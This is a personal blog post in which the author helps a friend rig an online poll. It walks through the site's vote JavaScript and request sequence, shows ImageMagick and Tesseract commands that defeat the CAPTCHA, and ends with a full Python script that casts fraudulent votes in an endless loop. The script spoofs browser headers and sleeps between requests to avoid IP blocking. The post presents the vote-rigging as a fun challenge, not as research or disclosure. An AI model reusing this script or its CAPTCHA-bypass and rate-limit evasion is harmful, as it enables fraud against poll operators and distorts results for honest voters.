<!DOCTYPE html><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title> Online Voting Manipulation</title><meta name="description" content=" A friend asked me to help her manipulate the results of an online poll. Being a challenge-lover, and not having done anything like this before, I gladly acce... "><link rel="stylesheet" href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/assets/main.css"><link rel="canonical" href="http://127.0.0.1:43110/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/2016/07/17/online-voting-manipulation.html"><link rel="alternate" type="application/rss+xml" title="Nerde Nolzda" href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/feed.xml"><header role="banner"> <a class="site-title" href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/">Nerde Nolzda</a><nav> <a href="#" class="menu-icon">&#9776;</a><div class="trigger"> <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/about/">About</a> <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/keys/">Keys</a> <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/mirrors/">Mirrors</a> <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/tag/">Tags</a> <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/feed.xml">RSS</a></div></nav></header><main><article itemscope itemtype="http://schema.org/BlogPosting"><header><h1 itemprop="name headline"> <a itemprop="mainEntityOfPage url" href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/2016/07/17/online-voting-manipulation.html"> Online Voting Manipulation </a></h1><p class="post-meta"> <time datetime="2016-07-17T18:21:43+08:00" itemprop="datePublished"> Jul 17, 2016 </time> • <time datetime="2018-06-02T22:24:25+08:00" itemprop="dateModified"> Jun 2, 2018 </time> • <span itemprop="author publisher" itemscope itemtype="http://schema.org/Person"> <span itemprop="name">WillyPillow</span> </span> • <span itemprop="keywords"> <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/tag/en.html" rel="tag">en</a>, <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/tag/voting.html" rel="tag">voting</a>, <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/tag/security.html" rel="tag">security</a>, <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/tag/python.html" rel="tag">python</a></span> • <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/sigs/posts/2016-07-17-online-voting-manipulation.md.asc"> Signature </a></p></header><div itemprop="articleBody text"><p>A friend asked me to help her manipulate the results of an online poll. Being a challenge-lover, and not having done anything like this before, I gladly accepted.</p><p>By using the Inspector tool in Firefox, we can clearly see that the vote button calls the Javascript function <code>chkCapPass(id)</code>, which, along with other related code, are listed below: (Comments are removed since they are in Chinese anyway.)</p><pre><code class="language-js">function chkCapPass(id) {
    $.ajax({
        url: "http://hidden/vote/chkcapnum",
        type: "post",
        dataType: "json",
        data: {},
        success: function(response) {
            if (response.status == "faild") {
                alertify.alert(response.errMsg, function() {});
            } else if (response.status == "success") {
                if (response.num &gt; 0) {
                    send_vote(id);
                } else {
                    $('.modal-content').html('');
                    $.ajax({
                        url: "http://hidden/vote/votecaptchain" + "/" + id,
                        type: "get",
                        success: function(response) {
                            $('.modal-content').html(response);
                        }
                    });
                    $('#showcap')[0].click();
                }
            }
        }
    });
}
isvote = "";

function send_vote(id) {
    if (isvote != '') {
        alertify.alert(isvote, function() {});
        return false;
    }
    $.ajax({
        url: "http://hidden/vote/to_vote",
        type: "post",
        dataType: "json",
        data: {
            voteid: id,
            captchain: $('#vote_captcha').val()
        },
        success: function(response) {
            if (response.status == "faild") {
                alertify.alert(response.errMsg, function() {});
            } else if (response.status == "success") {
                if ($('.close').length &gt; 0) {
                    $('.close')[0].click();
                }
                add_vote_num(id);
                isvote = "您今天已投過此項目";
                showlotteryview(response.chk_val, response.lottery, id);
            }
        }
    });
}
</code></pre><p>Combined with the network tab and manually sending a vote, it’s trivial to see that the process is as follows:</p><ol><li>Fetch <code>/vote/chkcapnum</code> to see if a CAPTCHA should be displayed<li>If so (in my tests, it seems to always be the case), get the CAPTCHA page from <code>/vote/votecaptchain/[id]</code><li>Fetch the CAPTCHA image from <code>/captcha/chkcode</code> (link from the previous step)<li>Send a POST request to <code>/vote/to_vote</code> with the id and CAPTCHA string</ol><p>After understanding the requests, we need to programatically solve the CAPTCHAs.</p><p>I tried to use <a href="https://github.com/tesseract-ocr/tesseract">Tesseract</a> for the job. However, a lot of the Python wrappers need some pip modules which isn’t that straightforward when installing on Windows, like PIL or <a href="http://opencv.org/">OpenCV</a>. (Asking the friend to install Linux in Virtualbox is, of course, difficult.)</p><p>Thus, I decided to directly call the command line program by <code>subprocess.Popen</code>. Dirty, but works. However, another problem arose: it does not seem to recognize the characters at all.</p><p>Then, I found <a href="https://gist.github.com/chroman/5679049">a snippet</a> that uses OpenCV to strengthen the image before feeding into Tesseract. However, as mentioned above, it seems that you need to jump through a lot of hoops to install OpenCV on Windows.</p><p>Thus, I launched <a href="https://www.gimp.org/">GIMP</a>, and used its “threshold” function. Essentially, this forces all pixels below a certain threshold into black, and those above into white. Sure enough, it worked like a charm.</p><p>Of course, I didn’t want to call such a large program (in fact, I don’t even know whether GIMP has a CLI). So I turned to <a href="http://www.imagemagick.org/">ImageMagick</a>, one of the most famous CLI image processing software.</p><p>After some trial an error, the following parameters seem to work best:</p><pre><code>convert captcha.png -black-threshold 60% -white-threshold 40% captcha-mod.png
</code></pre><p>Also, it is worth mentioning that calling Tesseract like the following:</p><pre><code>tesseract captcha-mod.png captcha-txt digits
</code></pre><p>Limits the results to numbers, which can potentially increase the accuracy here.</p><p>After trying the code out, however, it seems like the server blocks your IP if you send the requests too frequently. Of course, I could add some code that fetches a list of proxies from the Internet and rotate through them, but frankly I’m a bit lazy. So in the end I just added a simple <code>time.sleep(30)</code> in the loop.</p><p>The following is the resulting full code: (The website and vote id have been hidden/modified.)</p><pre><code class="language-py">from urllib import request, parse
from http.cookiejar import CookieJar
import subprocess
import time

while True:
  cj = CookieJar()
  opener = request.build_opener(request.HTTPCookieProcessor(cj))
  headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:46.0) Gecko/20100101 Firefox/46.0',
          'Accept-Language': 'zh-TW,en-US;q=0.7,en;q=0.3',
          'Accept-Encoding': 'gzip, deflate',
          'X-Requested-With': 'XMLHttpRequest',
          'Referer': 'http://hidden/project/inside/79/'}
  opener.addheader = headers

  opener.open('http://hidden/vote/chkcapnum')
  opener.open('http://hidden/vote/votecaptchain/123')

  resp = opener.open('http://hidden/captcha/chkcode')
  with open('captcha.png', 'wb') as pict:
      pict.write(resp.read())

  subprocess.Popen('Imagemagick\\convert.exe captcha.png -black-threshold 60% -white-threshold 40% captcha-mod.png').wait()
  subprocess.Popen('Tesseract\\tesseract.exe captcha-mod.png captcha-txt digits').wait()

  captchaStr = ''
  with open('captcha-txt.txt') as t:
    captchaStr = t.read().strip()

  params = parse.urlencode({'voteid': 123, 'captchain': captchaStr})
  headers.update({'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Accept': 'application/json, text/javascript, */*; q=0.01'})
  opener.addheader = headers
  resp = opener.open('http://hidden/vote/to_vote', params.encode('ASCII'))

  print(resp.read())
  time.sleep(30)
</code></pre></div><div><h1>Related Posts</h1><ul><li> <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/2018/08/24/setting-up-yubikey.html"> Setting Up Yubikey & NMC + Zeronet Update </a><li> <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/2017/10/23/revoking-my-gpg-keys.html"> Revoking My GPG Keys </a><li> <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/2017/02/06/freenet-on-qubes.html"> Freenet On Qubes </a><li> <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/2017/01/30/zeronet-offline-sign.html"> Zeronet Offline Sign </a><li> <a href="/1ncvmoP187AuEQkBsJHqEq8qcK1zcL2A9/2017/01/30/gpg-setup.html"> GPG Setup </a></ul></div><div><h1><span itemprop="commentCount">0</span> comments</h1><h2>Post a comment</h2><p> Send an email to <a href="mailto:comment@nerde.pw">comment@nerde.pw</a>.</p></div></article></main><footer itemscope itemtype="http://schema.org/Person"><ul><li itemprop="name">WillyPillow<li><a itemprop="email" href="mailto:wp@nerde.pw">wp@nerde.pw</a><li> Gitlab: <a href="https://gitlab.com/willypillow">WillyPillow</a><li> BitBucket: <a href="https://bitbucket.org/WillyPillow">WillyPillow</a><li> Github: <a href="https://github.com/WillyPillow">WillyPillow</a><li> Diaspora*: <a href="https://diasporing.ch/people/7abf8850bce50134011e7a163e59d8f4">WillyPillow</a><li> Reddit: <a href="https://www.reddit.com/user/WillyPillow/">WillyPillow</a><li>Bitcoin: 15ii2SMbgZSyzKxVSYwim7KtT2uqdSdjVm<li>Namecoin: NES89UkGDutphGbVYNUkGkQuRGs6vFQk6h</ul></footer>
